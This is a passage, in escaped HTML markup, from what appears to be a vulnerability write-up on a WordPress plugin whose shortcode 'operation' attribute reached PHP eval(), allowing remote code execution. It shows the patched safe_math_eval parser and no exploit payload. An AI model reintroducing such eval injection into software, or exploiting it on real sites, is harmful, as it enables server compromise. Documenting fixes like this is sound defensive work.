class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The value of &lt;code&gt;$attrs[&#39;operation&#39;]&lt;/code&gt; from the shortcode is directly concatenated into a PHP string and then passed to &lt;code&gt;eval()&lt;/code&gt;. An attacker can inject arbitrary PHP code ⇒ RCE.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patched version (v1.1.5):&lt;/strong&gt;&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$attrs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;operation&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$price&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;safe_math_eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$attrs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;operation&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$price&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Instead of using &lt;code&gt;eval()&lt;/code&gt;, a custom &lt;code&gt;safe_math_eval&lt;/code&gt; function is used, completely eliminating the ability to execute system code.&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;private&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;safe_math_eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$expression&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Remove&amp;ensp;any&amp;ensp;whitespace&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$expression&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/\s+/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$expression&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Only&amp;ensp;allow&amp;ensp;basic&amp;ensp;math&amp;ensp;operations,&amp;ensp;numbers,&amp;ensp;and&amp;ensp;the&amp;ensp;value&amp;ensp;keyword&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/^[0-9\.\+\-\*\/\(\)value]+$/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$expression&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Replace&amp;ensp;(value)&amp;ensp;with&amp;ensp;the&amp;ensp;actual&amp;ensp;value&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$expression&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;str_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;(value)&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$expression&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Use&amp;ensp;a&amp;ensp;safe&amp;ensp;evaluation&amp;ensp;method&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Split&amp;ensp;the&amp;ensp;expression&amp;ensp;into&amp;ensp;tokens&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$tokens&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;preg_split&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/([\+\-\*\/\(\)])/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$expression&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;PREG_SPLIT_DELIM_CAPTURE&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;PREG_SPLIT_NO_EMPTY&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Convert&amp;ensp;to&amp;ensp;Reverse&amp;ensp;Polish&amp;ensp;Notation&amp;ensp;(RPN)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$output&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$operators&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$tokens&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;as&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;is_numeric&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$output&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;elseif&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$token&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;(&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$operators&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;elseif&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$token&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;)&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$operators&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$operators&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!==&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;(&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$output&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;array_pop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$operators&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$operators&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$operators&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;(&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;array_pop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$operators&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$precedence&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;+&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;*&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$operators&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$operators&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!==&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;(&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span 